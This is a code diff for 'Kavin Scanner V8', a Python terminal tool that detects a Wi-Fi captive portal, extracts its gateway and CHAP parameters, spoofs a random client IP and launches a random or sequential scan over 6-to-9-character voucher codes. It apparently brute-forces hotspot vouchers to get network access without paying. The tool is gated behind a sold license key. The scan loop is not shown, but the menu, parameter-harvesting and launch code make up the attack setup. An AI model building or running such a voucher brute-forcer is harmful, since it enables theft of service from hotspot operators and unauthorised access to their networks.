+        console.print("  [bold bright_cyan]2.[/bold bright_cyan] 🔤  Alphabet Mode")
+        console.print("  [bold bright_cyan]3.[/bold bright_cyan] 🔀  Mixed Mode")
+        console.print("  [bold bright_red]0.[/bold bright_red] ❌  Exit\n")
+        choice = Prompt.ask("  [bright_cyan]➜ Select[/bright_cyan]").strip()
+        if choice == "0": return None
+        if choice not in ("1", "2", "3"): continue
+        return {"1": "num", "2": "eng", "3": "mix"}[choice]
+
+def ask_length(mode):
+    while True:
+        show_banner()
+        console.print("  [bold bright_white]Choose Voucher Length:[/bold bright_white]\n")
+        console.print("  [bold bright_cyan]1.[/bold bright_cyan] ⚡ 6 Characters")
+        console.print("  [bold bright_cyan]2.[/bold bright_cyan] ⚡ 7 Characters")
+        console.print("  [bold bright_cyan]3.[/bold bright_cyan] ⚡ 8 Characters")
+        console.print("  [bold bright_cyan]4.[/bold bright_cyan] ⚡ 9 Characters")
+        console.print("  [bold bright_red]0.[/bold bright_red] ↩ Back\n")
+        choice = Prompt.ask("  [bright_cyan]➜ Select[/bright_cyan]").strip()
+        if choice == "0": return None
+        if choice not in ("1", "2", "3", "4"): continue
+        return {"1": 6, "2": 7, "3": 8, "4": 9}[choice]
+
+def ask_scan_method():
+    while True:
+        show_banner()
+        console.print("  [bold bright_cyan]1.[/bold bright_cyan] 🎲  Random Mode")
+        console.print("  [bold bright_cyan]2.[/bold bright_cyan] 📈  Sequential Mode")
+        console.print("  [bold bright_red]0.[/bold bright_red] ↩ Back\n")
+        choice = Prompt.ask("  [bright_cyan]➜ Select[/bright_cyan]").strip()
+        if choice == "0": return None
+        if choice not in ("1", "2"): continue
+        return {"1": "random", "2": "sequential"}[choice]
+
+def run():
+    show_banner()
+    portal_url = auto_detect_portal()
+
+    gw_params = None
+    if portal_url:
+        extracted = extract_params_from_url(portal_url)
+        console.print(f"[bold green][+][/bold green] URL fetched successfully!")
+        time.sleep(1)
+        gw_params = {
+            "stage": "portal",
+            "gw_id": extracted.get("gw_id", "c4b25be7d323"),
+            "gw_sn": extracted.get("gw_sn", "H1U320P00210A"),
+            "gw_address": extracted.get("gw_address", "192.168.7.1"),
+            "gw_port": extracted.get("gw_port", "2060"),
+            "ip": generate_random_ip(), "mac": "",
+            "slot_num": extracted.get("slot_num", "14"),
+            "nasip": extracted.get("nasip", "192.168.1.193"),
+            "ssid": extracted.get("ssid", "VLAN7"),
+            "ustate": "0", "mac_req": "1",
+            "url": extracted.get("url", "http://connectivitycheck.gstatic.com/generate_204"),
+            "chap_id": extracted.get("chap_id", r"\245"),
+            "chap_challenge": extracted.get("chap_challenge", r"\124\275\237\157\043\371\050\266\227\342\155\205\324\112\266\067")
+        }
+    else:
+        console.print("[bold red][-][/bold red] Auto-detect failed. Using default gateway params.")
+        time.sleep(1.5)
+
+    while True:
+        mode = ask_mode()
+        if mode is None: return
+        length = ask_length(mode)
+        if length is None: continue
+        scan_method = ask_scan_method()
+        if scan_method is None: continue
+
+        try:
+            asyncio.run(scan_loop_async(mode, length, scan_method=scan_method, gw_params=gw_params))
+        except KeyboardInterrupt: pass
+        break
+
+# =====================================================================
+#  MAIN
+# =====================================================================
 def main():
-    clear()
-    if not _license: return
-    is_valid, msg = _license.check_approval()
-    while not is_valid:
-        clear()
-        console.print(Panel(Align.center(Text(f"{APP_TITLE}\n\n🔐 LICENSE REQUIRED\n\nYour Device ID:\n{_license.get_stable_device_id()}\n\nဒီ ID ကို key ထုတ်ဖို့ ပို့ပါ။", style="yellow")), border_style="yellow"))
-        console.print(f"[red]Status:[/red] {msg}")
-        key = Prompt.ask(" ➜ 📝 Paste License Key (Enter=exit)").strip()
-        if not key: return
-        ok, new_msg = _license.activate(key)
-        console.print(f"[green]{new_msg}[/green]" if ok else f"[red]{new_msg}[/red]")
-        time.sleep(2)
-        is_valid, msg = _license.check_approval()
-    
-    LICENSE_INFO["status"] = msg
-    url = auto_detect()
-    if not url: return
-    gw = extract_params(url)
-    
-    clear()
-    console.print(Panel(Align.center(Text("Choose Mode:\n1. NUM\n2. ENG\n3. MIX", style="cyan")), border_style="cyan"))
-    ch = input(" ➜ ").strip()
-    mode = "num" if ch == "1" else "eng" if ch == "2" else "mix"
-    
-    asyncio.run(scan_loop(gw))
+    global LICENSE_INFO
+    try:
+        is_valid, expiry_msg = check_license()
+        while not is_valid:
+            clear_screen()
+            console.print()
+            console.print(Text("══════════════════════════════════════", style="bold bright_cyan"), justify="center")
+            console.print(Text(APP_TITLE, style="bold bright_white"), justify="center")
+            console.print(Text("══════════════════════════════════════", style="bold bright_cyan"), justify="center")
+            console.print()
+
+            device_id = get_my_device_id()
+
+            console.print(Panel(
+                Align.center(Text.assemble(
+                    ("🔐 LICENSE REQUIRED\n\n", "bold yellow"),
+                    ("Your Device ID:\n", "bold cyan"),
+                    (f"{device_id}\n\n", "bold white"),
+                    ("ဒီ ID ကို key ထုတ်ဖို့ ပို့ပါ။", "dim")
+                )),
+                border_style="yellow", box=ROUNDED
+            ))
+
+            console.print()
+            console.print(f"  [bold red]Status:[/bold red] {expiry_msg}")
+            console.print()
+
+            key = Prompt.ask("   [bold bright_green]➜ 📝 Paste License Key (Enter=exit)[/bold bright_green]").strip()
+
+            if not key:
+                return
+
+            ok, msg = activate_license(key)
+            console.print(Panel(Align.center(Text(msg, style="bold bright_green" if ok else "bold red")),
+                                border_style="green" if ok else "red"))
+            time.sleep(2)
+            is_valid, expiry_msg = check_license()
+
+        LICENSE_INFO["status"] = expiry_msg
+        run()
+    except (KeyboardInterrupt, EOFError):
+        console.print("\n\n[bold red]Exiting Kavin Scanner V8...[/bold red]\n")
+    except Exception as e:
+        console.print(f"[bold red]Error: {e}[/bold red]")
+    finally:
+        try: clear_screen()
+        except Exception: pass
+        try:
+            console.print("\n\n")
+            console.print(Text("✨ Thank You • Contact @kavin799 for Key 🙏", style="bold bright_green"), justify="center")
+            console.print("\n\n")
+            time.sleep(1)
+        except Exception: pass
 
 if __name__ == "__main__":
     main()
